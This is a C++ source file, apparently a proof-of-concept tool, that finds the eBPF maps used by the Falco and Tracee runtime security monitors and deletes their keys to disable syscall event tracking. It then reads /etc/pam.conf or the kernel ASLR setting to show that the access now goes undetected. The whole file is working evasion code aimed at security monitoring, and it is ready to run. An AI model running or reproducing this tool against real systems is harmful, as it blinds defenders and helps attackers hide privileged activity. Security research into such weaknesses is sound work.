#include <bpf/libbpf.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <linux/if_link.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <fstream>
#include <iostream>

#define BPF_OBJ_NAME_LEN 16U

constexpr char FALCO[] = "-falco";
constexpr char FALCO_MAP[] = "syscall_exit_ta";
constexpr char FALCO_FILE[] = "/etc/pam.conf";

constexpr char TRACEE[] = "-tracee";
constexpr char TRACEE_MAP[] = "events_map";
constexpr char TRACEE_FILE[] = "/proc/sys/kernel/randomize_va_space";

const size_t attr_sz = sizeof(union bpf_attr);
const __u32 info_len = sizeof(struct bpf_map_info);

struct bpf_get_fd_by_id_opts {
    size_t sz; /* size of this struct for forward/backward compatibility */
    __u32 open_flags; /* permissions requested for the operation on fd */
    size_t :0;
};

// The documentation seems to lie about the structure
struct map_elem {    /* Used by BPF_MAP_*_ELEM and BPF_MAP_GET_NEXT_KEY commands */
    __u32 key;
    __aligned_u64 key2;
    union {
        __aligned_u64 value;
        __aligned_u64 next_key;
    };
    __u64 flags;
};

int sys_bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(SYS_bpf, cmd, attr, size);
}
int bpf_map_delete_elem(int fd, const void *key) {
    union bpf_attr attr;
    int ret;

    memset(&attr, 0, attr_sz);
    attr.map_fd = fd;
    attr.key = (__u64) key;

    return sys_bpf(BPF_MAP_DELETE_ELEM, &attr, attr_sz);
}

int bpf_map_get_next_key(int fd, const void *key, void *next_key)
{
    union bpf_attr attr;
    int ret;

    memset(&attr, 0, attr_sz);
    attr.map_fd = fd;
    attr.key = (__u64) key;
    attr.next_key = (__u64) next_key;

    return sys_bpf(BPF_MAP_GET_NEXT_KEY, &attr, attr_sz);
}

int bpf_obj_get_info_by_fd(int bpf_fd, void *info) {
    union bpf_attr attr;
    int err;
    memset(&attr, 0, attr_sz);
    attr.info.bpf_fd = bpf_fd;
    attr.info.info_len = info_len;
    attr.info.info = (__u64) info;

    err = sys_bpf(BPF_OBJ_GET_INFO_BY_FD, &attr, attr_sz);
    return err;
}

int bpf_map_get_fd_by_id_opts(__u32 id,
                  const struct bpf_get_fd_by_id_opts *opts) {
    union bpf_attr attr;
    int fd;


    memset(&attr, 0, attr_sz);
    attr.map_id = id;
    attr.open_flags = 0;

    fd = sys_bpf(BPF_MAP_GET_FD_BY_ID, &attr, attr_sz);
    return fd;
}

int bpf_map_get_fd_by_id(__u32 id) {
    return bpf_map_get_fd_by_id_opts(id, NULL);
}


static int bpf_obj_get_next_id(__u32 start_id, __u32 *next_id, int cmd) {
    union bpf_attr attr;
    int err;

    memset(&attr, 0, attr_sz);
    attr.start_id = start_id;

    err = sys_bpf(cmd, &attr, attr_sz);
    if (!err)
        *next_id = attr.next_id;

    return err;
}

int bpf_map_get_next_id(__u32 start_id, __u32 *next_id) {
    return bpf_obj_get_next_id(start_id, next_id, BPF_MAP_GET_NEXT_ID);
}

void print_file_contents(const std::string &filename) {
    std::ifstream file(filename);

    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            std::cout << line << std::endl;
        }
        file.close();
    } else {
        std::cerr << "Error opening file: " << filename << std::endl;
    }
}

void delete_keys(int fd, const char *map_name) {
    std::cout << "Targeting map " << map_name << std::endl;
    struct map_elem map_item = {};
    while (bpf_map_get_next_key(fd, &map_item, &map_item) == 0) {
        __u32 key = static_cast<__u32>(map_item.key);
        if (bpf_map_delete_elem(fd, &key) == 0) {
            std::cout << "\tDeleted key " << key << " from " << map_name << std::endl;
        }
        key++;
    }
}

void attack_map(const char *map_name, const char *target_file) {
    __u32 id = 0;
    while (bpf_map_get_next_id(id, &id) == 0) {
        struct bpf_get_fd_by_id_opts opts = {};
        struct bpf_map_info info = {};
        int fd = bpf_map_get_fd_by_id_opts(id, &opts);
        bpf_obj_get_info_by_fd(fd, &info);
        if (strcmp(info.name, map_name) == 0) {
            delete_keys(fd, map_name);
        }
        close(fd);
    }
    print_file_contents(target_file);
}

void print_usage() {
    std::cout << "Usage ./delete_keys [-tracee|-falco] " << std::endl;
    std::cout << "     -tracee: Target tracee" << std::endl;
    std::cout << "     -falco: Target falco" << std::endl;
}

int main(int argc, char *argv[]) {
    char *target = NULL;
    if (argc == 2) {
        target = argv[1];
    } else {
        print_usage();
        return 0;
    }

    if (strcmp(target, TRACEE) == 0) {
        attack_map(TRACEE_MAP, TRACEE_FILE);
    } else if (strcmp(target, FALCO) == 0) {
        attack_map(FALCO_MAP, FALCO_FILE);
    } else {
        print_usage();
    }
}


